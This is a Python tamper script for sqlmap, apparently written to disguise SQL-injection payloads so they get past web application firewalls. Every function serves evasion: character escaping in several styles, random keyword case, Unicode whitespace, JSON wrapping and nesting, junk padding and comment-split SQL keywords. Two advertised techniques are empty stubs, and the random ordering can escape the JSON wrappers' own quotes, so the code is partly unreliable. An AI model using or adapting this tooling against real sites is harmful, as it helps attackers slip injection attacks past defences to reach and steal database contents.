#!/usr/bin/env python
"""
Ultimate JSON obfuscation tamper for sqlmap.

Applies a wide range of JSON‑specific evasion techniques:
- Unicode escaping (multiple styles: \u, \x, double‑escape)
- Random case variation for SQL keywords
- Whitespace obfuscation using various space characters
- JSON wrapping (simple, nested, arrays, and complex objects)
- Junk data injection to bypass size limits
- SQL comment injection inside JSON strings
- Hexadecimal and octal escapes
- JSON string concatenation
- Configurable via the SETTINGS dict below.

__priority__ = PRIORITY.NORMAL
"""

import re
import json
import random
import string
import base64
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.NORMAL

# ==================== CONFIGURATION ====================
# Set each technique to True/False or adjust probabilities
SETTINGS = {
    'unicode_escape': True,          # Convert chars to \uXXXX
    'hex_escape': False,             # Convert chars to \xXX (less common)
    'double_escape': False,          # Double encode \u -> \\u (may break)
    'random_case': True,             # Randomise SQL keyword case
    'space_obfuscation': True,       # Replace spaces with various whitespace chars
    'json_wrap': True,               # Wrap payload in a JSON object
    'nested_wrap': True,             # Use deep nesting
    'array_wrap': False,             # Wrap in a JSON array
    'add_junk': False,               # Add random junk to bypass size filters
    'comment_injection': False,      # Insert /**/ inside SQL keywords
    'octal_escape': False,           # Use \0xxx octal escapes
    'unicode_alternative': False,    # Use \u{XXXX} style (ES6)
    'json_string_concat': False,     # Break payload into concatenated JSON strings
    'random_payload_partition': False # Split payload into multiple JSON keys
}

# ==================== CORE OBFUSCATION FUNCTIONS ====================

def unicode_escape(payload):
    """
    Convert dangerous characters to \uXXXX Unicode escapes.
    Includes a comprehensive mapping of SQL‑relevant characters.
    """
    escapes = {
        "'": "\\u0027",
        '"': "\\u0022",
        "=": "\\u003d",
        " ": "\\u0020",
        "(": "\\u0028",
        ")": "\\u0029",
        ";": "\\u003b",
        "-": "\\u002d",
        "_": "\\u005f",
        "%": "\\u0025",
        "+": "\\u002b",
        "*": "\\u002a",
        "/": "\\u002f",
        "\\": "\\u005c",
        "|": "\\u007c",
        "&": "\\u0026",
        "^": "\\u005e",
        "~": "\\u007e",
        "!": "\\u0021",
        "@": "\\u0040",
        "#": "\\u0023",
        "$": "\\u0024",
        "?": "\\u003f",
        ":": "\\u003a",
        ",": "\\u002c",
        ".": "\\u002e",
        "[": "\\u005b",
        "]": "\\u005d",
        "{": "\\u007b",
        "}": "\\u007d",
        "<": "\\u003c",
        ">": "\\u003e",
        "`": "\\u0060",
    }
    for char, esc in escapes.items():
        payload = payload.replace(char, esc)
    return payload

def hex_escape(payload):
    """Convert characters to \\xXX hexadecimal escapes."""
    escapes = {
        "'": "\\x27",
        '"': "\\x22",
        "=": "\\x3d",
        " ": "\\x20",
        "(": "\\x28",
        ")": "\\x29",
        ";": "\\x3b",
        "-": "\\x2d",
        "_": "\\x5f",
        "%": "\\x25",
        "+": "\\x2b",
        "*": "\\x2a",
        "/": "\\x2f",
        "\\": "\\x5c",
        "|": "\\x7c",
        "&": "\\x26",
        "^": "\\x5e",
        "~": "\\x7e",
        "!": "\\x21",
        "@": "\\x40",
        "#": "\\x23",
        "$": "\\x24",
        "?": "\\x3f",
        ":": "\\x3a",
        ",": "\\x2c",
        ".": "\\x2e",
        "[": "\\x5b",
        "]": "\\x5d",
        "{": "\\x7b",
        "}": "\\x7d",
        "<": "\\x3c",
        ">": "\\x3e",
        "`": "\\x60",
    }
    for char, esc in escapes.items():
        payload = payload.replace(char, esc)
    return payload

def octal_escape(payload):
    """Convert characters to \\0XXX octal escapes (less common in JSON but valid)."""
    escapes = {
        "'": "\\047",
        '"': "\\042",
        "=": "\\075",
        " ": "\\040",
        "(": "\\050",
        ")": "\\051",
        ";": "\\073",
        "-": "\\055",
        "_": "\\137",
        "%": "\\045",
        "+": "\\053",
        "*": "\\052",
        "/": "\\057",
        "\\": "\\134",
        "|": "\\174",
        "&": "\\046",
        "^": "\\136",
        "~": "\\176",
        "!": "\\041",
        "@": "\\100",
        "#": "\\043",
        "$": "\\044",
        "?": "\\077",
        ":": "\\072",
        ",": "\\054",
        ".": "\\056",
        "[": "\\133",
        "]": "\\135",
        "{": "\\173",
        "}": "\\175",
        "<": "\\074",
        ">": "\\076",
        "`": "\\140",
    }
    for char, esc in escapes.items():
        payload = payload.replace(char, esc)
    return payload

def double_escape(payload):
    """Double‑escape by converting \ to \\ (e.g., \u0027 -> \\u0027)."""
    # First apply a basic unicode escape, then escape the backslashes
    temp = unicode_escape(payload)
    return temp.replace("\\u", "\\\\u")

def random_case(payload):
    """Randomly change case of alphabetic characters."""
    result = []
    for ch in payload:
        if ch.isalpha() and random.random() > 0.5:
            result.append(ch.upper() if random.choice([True, False]) else ch.lower())
        else:
            result.append(ch)
    return ''.join(result)

def space_obfuscation(payload):
    """
    Replace regular spaces with a random selection of whitespace characters.
    Includes: space, \u0020, \t, \n, \r, \u00a0 (non‑breaking space), etc.
    """
    spaces = [
        " ", "\u0020", "\t", "\n", "\r",
        "\u00a0",  # non‑breaking space
        "\u2000", "\u2001", "\u2002", "\u2003",
        "\u2004", "\u2005", "\u2006", "\u2007",
        "\u2008", "\u2009", "\u200a",
        "\u202f",  # narrow non‑breaking space
        "\u205f"   # medium mathematical space
    ]
    result = []
    for ch in payload:
        if ch == ' ' and random.random() > 0.5:
            result.append(random.choice(spaces))
        else:
            result.append(ch)
    return ''.join(result)

def json_wrap(payload):
    """Wrap payload in a simple JSON object with random key."""
    wrappers = [
        lambda p: f'{{"data":"{p}"}}',
        lambda p: f'{{"input":"{p}"}}',
        lambda p: f'{{"query":"{p}"}}',
        lambda p: f'{{"sql":"{p}"}}',
        lambda p: f'{{"search":"{p}"}}',
        lambda p: f'{{"filter":"{p}"}}',
        lambda p: f'{{"where":"{p}"}}',
        lambda p: f'{{"condition":"{p}"}}',
        lambda p: f'{{"value":"{p}"}}',
        lambda p: f'{{"param":"{p}"}}',
    ]
    return random.choice(wrappers)(payload)

def nested_json_wrap(payload):
    """Wrap in deeply nested JSON structures."""
    wrappers = [
        lambda p: f'{{"user":{{"input":"{p}"}}}}',
        lambda p: f'{{"data":{{"query":"{p}"}}}}',
        lambda p: f'{{"request":{{"body":{{"sql":"{p}"}}}}}}',
        lambda p: f'{{"filters":[{{"field":"id","value":"{p}"}}]}}',
        lambda p: f'{{"query":{{"bool":{{"must":[{{"match":{{"field":"{p}"}}}}]}}}}}}',
        lambda p: f'{{"payload":{{"content":"{p}"}}}}',
        lambda p: f'{{"parameters":{{"key":"{p}"}}}}',
    ]
    return random.choice(wrappers)(payload)

def array_wrap(payload):
    """Wrap payload inside a JSON array."""
    wrappers = [
        lambda p: f'["{p}"]',
        lambda p: f'[{{"value":"{p}"}}]',
        lambda p: f'{{"data":["{p}"]}}',
        lambda p: f'{{"items":[{{"id":1,"value":"{p}"}}]}}',
    ]
    return random.choice(wrappers)(payload)

def add_junk_data(payload):
    """Append a large junk field to bypass WAF size limits."""
    junk_size = random.randint(1000, 5000)
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=junk_size))
    return f'{{"junk":"{junk}","payload":"{payload}"}}'

def inject_sql_comments(payload):
    """Insert /**/ comments inside SQL keywords to break tokenisation."""
    keywords = [
        "SELECT", "UNION", "ALL", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
        "GROUP", "HAVING", "LIMIT", "OFFSET", "INSERT", "UPDATE", "DELETE",
        "DROP", "CREATE", "ALTER", "EXEC", "EXECUTE"
    ]
    for kw in keywords:
        if len(kw) > 3:
            # Random split position inside the keyword
            pos = random.randint(1, len(kw)-2)
            obfuscated = kw[:pos] + "/**/" + kw[pos:]
            pattern = re.compile(r'\b' + kw + r'\b', re.IGNORECASE)
            payload = pattern.sub(obfuscated, payload)
    return payload

def json_string_concat(payload):
    """
    Break the payload into multiple JSON string fragments that get concatenated.
    e.g., "SEL" + "ECT" -> "SELECT" (in JSON, concatenation with + may not work,
    but we can use array join: ["SE","LECT"].join('') – but that's JavaScript, not JSON.
    JSON itself doesn't support concatenation, but we can use string formatting.
    However, we can split into multiple key/value pairs that the application might combine.
    This is more of a server‑side logic trick.
    For simplicity, we'll just split the payload into parts and join with spaces or comments.
    """
    # This is a placeholder; might not be safe for all targets.
    # We'll just return payload unchanged for now, as it's experimental.
    return payload

def random_payload_partition(payload):
    """
    Split the payload into multiple JSON keys (e.g., {"a":"SE","b":"LECT"})
    The server might concatenate them. This is target‑specific.
    """
    # Not implemented to keep simple; could be added later.
    return payload

# ==================== MAIN TAMPER ====================

def tamper(payload, **kwargs):
    """
    Apply a random selection of enabled obfuscation techniques.
    """
    if not payload:
        return payload

    # Randomly decide which techniques to apply based on SETTINGS
    # We'll build a list of functions and apply them in order.
    techniques = []
    if SETTINGS.get('unicode_escape', False):
        techniques.append(unicode_escape)
    if SETTINGS.get('hex_escape', False):
        techniques.append(hex_escape)
    if SETTINGS.get('double_escape', False):
        techniques.append(double_escape)
    if SETTINGS.get('random_case', False):
        techniques.append(random_case)
    if SETTINGS.get('space_obfuscation', False):
        techniques.append(space_obfuscation)
    if SETTINGS.get('json_wrap', False):
        techniques.append(json_wrap)
    if SETTINGS.get('nested_wrap', False):
        techniques.append(nested_json_wrap)
    if SETTINGS.get('array_wrap', False):
        techniques.append(array_wrap)
    if SETTINGS.get('add_junk', False):
        techniques.append(add_junk_data)
    if SETTINGS.get('comment_injection', False):
        techniques.append(inject_sql_comments)
    if SETTINGS.get('octal_escape', False):
        techniques.append(octal_escape)
    # Additional techniques can be added here

    # Shuffle techniques to vary order
    random.shuffle(techniques)

    ret_val = payload
    for tech in techniques:
        try:
            ret_val = tech(ret_val)
        except Exception as e:
            # Log error (optional) and continue with next technique
            # Use singleTimeWarnMessage to avoid flooding
            singleTimeWarnMessage(f"JSON tamper technique {tech.__name__} failed: {e}")
            continue

    return ret_val

def dependencies():
    pass
